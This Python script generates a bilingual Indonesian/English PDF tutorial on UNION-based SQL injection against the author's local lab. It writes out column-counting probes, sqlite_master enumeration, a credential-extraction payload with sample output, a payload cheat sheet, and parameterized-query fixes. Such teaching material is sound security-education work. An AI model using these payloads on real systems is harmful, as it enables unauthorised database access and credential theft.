# -*- coding: utf-8 -*-
"""
Generator modul VER-02 (UNION Attack) — gaya GENETEC monokrom.
Output DUA file: Bahasa Indonesia + English (terpisah, bukan dwibahasa).
Reporter: Verzen
"""
from reportlab.lib.colors import HexColor
from reportlab.lib.enums import TA_LEFT
from reportlab.lib.styles import ParagraphStyle
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.ttfonts import TTFont
from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                TableStyle, Preformatted, HRFlowable, KeepTogether)

# ---------- font ----------
pdfmetrics.registerFont(TTFont("Sans",   "C:/Windows/Fonts/segoeui.ttf"))
pdfmetrics.registerFont(TTFont("SansB",  "C:/Windows/Fonts/segoeuib.ttf"))
pdfmetrics.registerFont(TTFont("Mono",   "C:/Windows/Fonts/consola.ttf"))
pdfmetrics.registerFont(TTFont("MonoB",  "C:/Windows/Fonts/consolab.ttf"))

BG    = HexColor("#f5f5f5")
BOX   = HexColor("#ececec")
INK   = HexColor("#111111")
GRAY  = HexColor("#777777")
LINE  = HexColor("#cccccc")

PAGE_W, PAGE_H = 612, 792          # Letter, sama seperti referensi
MARGIN = 60


def spaced(text):
    return " ".join(list(text.replace(" ", "  ")))


def styles():
    s = {}
    s["word"]  = ParagraphStyle("w",  fontName="SansB", fontSize=16, leading=18,
                                textColor=INK)
    s["title"] = ParagraphStyle("t",  fontName="Mono", fontSize=10, leading=14,
                                textColor=INK)
    s["h"]     = ParagraphStyle("h",  fontName="SansB", fontSize=10, leading=13,
                                spaceBefore=14, spaceAfter=5, textColor=INK)
    s["body"]  = ParagraphStyle("b",  fontName="Sans", fontSize=10, leading=14.5,
                                textColor=INK, alignment=TA_LEFT)
    s["mono"]  = ParagraphStyle("m",  fontName="Mono", fontSize=9, leading=13,
                                textColor=INK)
    s["note"]  = ParagraphStyle("n",  fontName="Sans", fontSize=8.5, leading=12,
                                textColor=GRAY)
    s["code"]  = ParagraphStyle("c",  fontName="Mono", fontSize=8.3, leading=11.6,
                                textColor=INK, backColor=BOX,
                                borderPadding=5, borderWidth=0.4,
                                borderColor=LINE, spaceBefore=3, spaceAfter=3)
    return s


def code_block(story, s, text):
    story.append(Preformatted(text, s["code"]))


def result_table(rows, header):
    data = [header] + rows
    t = Table(data, colWidths=[150, 330])
    t.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (-1, 0), "MonoB"),
        ("FONTNAME", (0, 1), (-1, -1), "Mono"),
        ("FONTSIZE", (0, 0), (-1, -1), 8.3),
        ("TEXTCOLOR", (0, 0), (-1, 0), HexColor("#ffffff")),
        ("BACKGROUND", (0, 0), (-1, 0), INK),
        ("GRID", (0, 0), (-1, -1), 0.4, LINE),
        ("TOPPADDING", (0, 0), (-1, -1), 3.5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 3.5),
    ]))
    return t


def objectives_table(objs, header):
    data = [header] + objs
    t = Table(data, colWidths=[70, 70, 340])
    t.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (0, -1), "MonoB"),
        ("FONTNAME", (1, 0), (1, -1), "MonoB"),
        ("FONTNAME", (2, 0), (2, -1), "Sans"),
        ("FONTSIZE", (0, 0), (-1, -1), 8.3),
        ("LINEBELOW", (0, 0), (-1, 0), 0.8, INK),
        ("LINEBELOW", (0, 1), (-1, -1), 0.3, LINE),
        ("TOPPADDING", (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ]))
    return t


def paint_bg(canvas, doc):
    canvas.saveState()
    canvas.setFillColor(BG)
    canvas.rect(0, 0, PAGE_W, PAGE_H, fill=1, stroke=0)
    canvas.setFont("Mono", 7.5)
    canvas.setFillColor(GRAY)
    canvas.drawString(MARGIN, 34, "verzen · web security learning modules · VER-02")
    canvas.drawRightString(PAGE_W - MARGIN, 34, f"page {canvas.getPageNumber()}")
    canvas.restoreState()


def build(lang):
    s = styles()
    S = []
    A = S.append
    ID = lang == "id"

    # ================= HEADER =================
    A(Paragraph("VERZEN", s["word"]))
    A(Spacer(1, 6))
    A(Paragraph(spaced("WEB SECURITY LEARNING MODULE"), s["title"]))
    A(Spacer(1, 10))

    meta = [
        ("REPORTER", "Verzen"),
        ("MODULE",   "VER-02 — UNION Attack (SQL Injection)"),
        ("LEVEL",    "MEDIUM"),
        ("TARGET",   "http://127.0.0.1:8011 — lab lokal milik sendiri (SQLite)"),
        ("PREREQ",   "VER-01 — filter bypass dengan OR 1=1"),
        ("METHOD",   "Probing manual via curl + browser: penghitungan kolom "
                     "ORDER BY, ekstraksi UNION SELECT, reproduksi clean-session."),
    ]
    for label, val in meta:
        A(Paragraph(
            f'<font name="MonoB" size="9">{label}</font>  '
            f'<font name="Mono" size="9">{val}</font>', s["mono"]))
        A(Spacer(1, 2))
    A(Spacer(1, 8))
    A(HRFlowable(width="100%", thickness=0.8, color=INK))
    A(Spacer(1, 4))

    # ================= SUMMARY =================
    A(Paragraph("Summary" if not ID else "Ringkasan", s["h"]))
    hdr = ["ID", "LEVEL", "OBJECTIVE" if not ID else "TUJUAN"]
    objs = [
        ("VER-02.1", "STEP", "Hitung jumlah kolom query rentan dengan ORDER BY"),
        ("VER-02.2", "STEP", "Identifikasi kolom yang menampilkan teks (UNION SELECT string)"),
        ("VER-02.3", "GOAL", "Ekstrak username + password tabel users tersembunyi — "
                             "dapatkan kredensial administrator"),
    ]
    A(objectives_table(objs, hdr))
    A(Spacer(1, 6))

    # ================= DESCRIPTION =================
    A(Paragraph("DESCRIPTION" if ID else "DESCRIPTION", s["h"]))
    if ID:
        A(Paragraph(
            "Di lab pemula (VER-01), payload OR 1=1 hanya <b>mematikan filter</b> — "
            "data yang bocor tetap berasal dari query asli. Serangan UNION naik kelas: "
            "operator UNION <b>menempelkan hasil query kedua</b> buatan penyerang ke "
            "hasil query asli. Server bisa dibuat menjalankan "
            "<font face='Mono' size='9'>SELECT password FROM users</font> lalu "
            "menampilkannya di halaman produk.", s["body"]))
        A(Paragraph("Syarat mutlak UNION (wajib dipenuhi keduanya):", s["body"]))
        A(Paragraph(
            "1. Jumlah kolom <b>sama</b> dengan query asli — dipastikan dengan ORDER BY.<br/>"
            "2. Tipe data tiap kolom <b>kompatibel</b> — dipastikan dengan mengganti "
            "nilai dengan string <font face='Mono' size='9'>'a'</font> atau NULL.", s["body"]))
    else:
        A(Paragraph(
            "In the beginner lab (VER-01), OR 1=1 only <b>disabled a filter</b> — the "
            "leaked rows still came from the original query. The UNION attack levels up: "
            "the UNION operator <b>appends the results of a second query</b> crafted by "
            "the attacker to the original results. We can make the server run "
            "<font face='Mono' size='9'>SELECT password FROM users</font> and render "
            "the output on the product page.", s["body"]))
        A(Paragraph("UNION has two strict requirements:", s["body"]))
        A(Paragraph(
            "1. The <b>same number of columns</b> as the original query — verified with "
            "ORDER BY.<br/>"
            "2. <b>Compatible data types</b> per column — verified by substituting the "
            "string <font face='Mono' size='9'>'a'</font> or NULL.", s["body"]))

    # ================= METHODOLOGY =================
    A(Paragraph("METHODOLOGY — 4 STEPS" if not ID else "METODOLOGI — 4 LANGKAH", s["h"]))
    steps_id = [
        "<b>Hitung kolom:</b> suntik ' ORDER BY 1--, lalu 2--, 3-- ... Angka terbesar "
        "yang TIDAK menyebabkan error = jumlah kolom.",
        "<b>Cari kolom teks:</b> suntik ' UNION SELECT 'a',NULL-- lalu "
        "' UNION SELECT NULL,'a'--. Kolom yang menampilkan 'a' = kolom teks.",
        "<b>Temukan nama tabel:</b> tebak umum (users, accounts) atau baca "
        "sqlite_master (SQLite) / information_schema (MySQL).",
        "<b>Ekstrak data:</b> ' UNION SELECT username,password FROM users--",
    ]
    steps_en = [
        "<b>Count columns:</b> inject ' ORDER BY 1--, then 2--, 3-- ... The largest "
        "number that does NOT error = the column count.",
        "<b>Find text columns:</b> inject ' UNION SELECT 'a',NULL-- then "
        "' UNION SELECT NULL,'a'--. Whichever renders 'a' accepts text.",
        "<b>Find table names:</b> try common guesses (users, accounts) or read "
        "sqlite_master (SQLite) / information_schema (MySQL).",
        "<b>Extract data:</b> ' UNION SELECT username,password FROM users--",
    ]
    for i, st in enumerate(steps_id if ID else steps_en, 1):
        A(Paragraph(f"{i}. {st}", s["body"]))
        A(Spacer(1, 2))

    # ================= WALKTHROUGH =================
    A(Paragraph("REPRODUCTION STEPS" if not ID else "LANGKAH REPRODUKSI", s["h"]))
    if ID:
        A(Paragraph(
            "Semua request dijalankan pada lab lokal (127.0.0.1:8011) milik sendiri. "
            "Karakter ' dikirim sebagai %27, spasi sebagai %20.", s["note"]))
        A(Paragraph("Langkah 1 — ORDER BY (penghitungan kolom)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%202--   -> 200 OK\n"
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%203--   -> 500 ERROR\n"
            "Kesimpulan: query asli memiliki 2 kolom (nama, harga).")
        A(Paragraph("Langkah 2 — UNION SELECT string (cek kolom teks)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--\n"
            "Hasil: baris baru \"a | b\" tampil di tabel -> kedua kolom menerima teks.")
        A(Paragraph("Langkah 3 — Ekstraksi kredensial (serangan utama)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--\n"
            "Query server yang terbajak:\n"
            "SELECT nama, harga FROM products WHERE kategori = '' UNION\n"
            "SELECT username, password FROM users--' AND released = 1")
    else:
        A(Paragraph(
            "All requests run against our own local lab (127.0.0.1:8011). "
            "' is sent as %27 and spaces as %20.", s["note"]))
        A(Paragraph("Step 1 — ORDER BY (column counting)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%202--   -> 200 OK\n"
            "GET /filter?kategori=Gifts%27%20ORDER%20BY%203--   -> 500 ERROR\n"
            "Conclusion: the original query has 2 columns (name, price).")
        A(Paragraph("Step 2 — UNION SELECT strings (text-column probe)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=%27%20UNION%20SELECT%20%27a%27,%27b%27--\n"
            "Result: a new row \"a | b\" appears -> both columns accept text.")
        A(Paragraph("Step 3 — Credential extraction (main attack)", s["body"]))
        code_block(S, s,
            "GET /filter?kategori=%27%20UNION%20SELECT%20username,password%20FROM%20users--\n"
            "Hijacked server-side query:\n"
            "SELECT name, price FROM products WHERE category = '' UNION\n"
            "SELECT username, password FROM users--' AND released = 1")

    # ================= RESULT =================
    A(Paragraph("RESULT" if not ID else "HASIL", s["h"]))
    hdr2 = ["USERNAME", "PASSWORD"] if not ID else ["USERNAME", "PASSWORD"]
    rows = [
        ["administrator", "Flag{union_attack_medium}"],
        ["carlos", "Montoya123"],
        ["wiener", "PeterW1ener"],
    ]
    A(result_table(rows, hdr2))
    A(Spacer(1, 3))
    A(Paragraph(
        "Row order may vary. administrator + flag = mission complete."
        if not ID else
        "Urutan baris bisa berbeda. administrator + flag = misi selesai.", s["note"]))

    # ================= WHY =================
    A(Paragraph("WHY IT WORKS" if not ID else "MENGAPA BERHASIL", s["h"]))
    if ID:
        A(Paragraph(
            "Query asli mengembalikan 2 kolom; query penyerang juga 2 — jumlah dan "
            "tipe cocok sehingga SQLite mengeksekusi keduanya dan menempelkan hasilnya. "
            "Kode server menampilkan SEMUA baris tanpa memeriksa asal-usulnya, sehingga "
            "kredensial ikut ter-render di halaman produk. Titik lemah sebenarnya bukan "
            "UNION-nya, melainkan <b>penggabungan string input ke SQL</b>.", s["body"]))
    else:
        A(Paragraph(
            "The original query returns 2 columns; the attacker's query also returns 2 — "
            "count and types match, so SQLite executes both and concatenates the results. "
            "The server renders EVERY row without provenance checks, so credentials end "
            "up on the product page. The real weakness is not UNION itself but "
            "<b>concatenating user input into SQL</b>.", s["body"]))

    # ================= RECOMMENDATION =================
    A(Paragraph("RECOMMENDATION" if not ID else "REKOMENDASI", s["h"]))
    rec_id = [
        "<b>Parameterized query</b> — input tidak pernah menjadi kode SQL:",
        "<b>Whitelist kategori</b> — validasi nilai terhadap daftar tetap.",
        "<b>Least privilege</b> — akun DB aplikasi tidak butuh membaca tabel users.",
        "<b>Jangan tampilkan error mentah</b> — catat di log internal saja.",
    ]
    rec_en = [
        "<b>Parameterized queries</b> — user input never becomes SQL code:",
        "<b>Category whitelist</b> — validate against a fixed list.",
        "<b>Least privilege</b> — the app's DB account shouldn't read users at all.",
        "<b>Never surface raw errors</b> — log them server-side only.",
    ]
    for i, r in enumerate(rec_id if ID else rec_en, 1):
        A(Paragraph(f"{i}. {r}", s["body"]))
        A(Spacer(1, 2))
    code_block(S, s,
        "cur.execute(\"SELECT nama, harga FROM products "
        "WHERE kategori = ? AND released = 1\", (kategori,))")

    # ================= CHEATSHEET =================
    A(Paragraph("APPENDIX — UNION CHEAT SHEET" if not ID else "LAMPIRAN — CHEAT SHEET UNION", s["h"]))
    code_block(S, s,
        "Jumlah kolom      : ' ORDER BY N--              (naikkan N sampai error)\n"
        "Kolom teks        : ' UNION SELECT 'a',NULL--   (geser 'a' ke tiap kolom)\n"
        "Nama tabel (SQLit): ' UNION SELECT name,NULL FROM sqlite_master--\n"
        "Skema tabel       : ' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'\n"
        "Ekstrak data      : ' UNION SELECT username,password FROM users--\n"
        "MySQL ekuivalen   : information_schema.tables / .columns")

    # ================= LEGAL =================
    A(Paragraph("LEGAL NOTICE" if not ID else "CATATAN HUKUM", s["h"]))
    if ID:
        A(Paragraph(
            "Seluruh teknik dalam modul ini hanya untuk lab milik sendiri (localhost). "
            "Menggunakannya pada sistem pihak lain tanpa izin tertulis merupakan "
            "tindakan ilegal. Jalur legal menuju target nyata: program bug bounty "
            "dengan scope jelas (HackerOne, Bugcrowd, Immunefi).", s["body"]))
    else:
        A(Paragraph(
            "Every technique in this module is strictly for your own local lab "
            "(localhost). Using them against systems you do not own, without written "
            "permission, is illegal. The legitimate path to real targets: bug bounty "
            "programs with explicit scope (HackerOne, Bugcrowd, Immunefi).", s["body"]))

    out = (r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/MODUL-VER-02-UNION-ATTACK_ID.pdf"
           if ID else
           r"C:/Users/verzen/Desktop/belajar-coding/lab-sqli/MODUL-VER-02-UNION-ATTACK_EN.pdf")
    doc = SimpleDocTemplate(out, pagesize=(PAGE_W, PAGE_H),
                            topMargin=56, bottomMargin=52,
                            leftMargin=MARGIN, rightMargin=MARGIN,
                            title=f"VER-02 UNION Attack ({'ID' if ID else 'EN'}) — Verzen")
    doc.build(S, onFirstPage=paint_bg, onLaterPages=paint_bg)
    print("OK:", out)


build("id")
build("en")
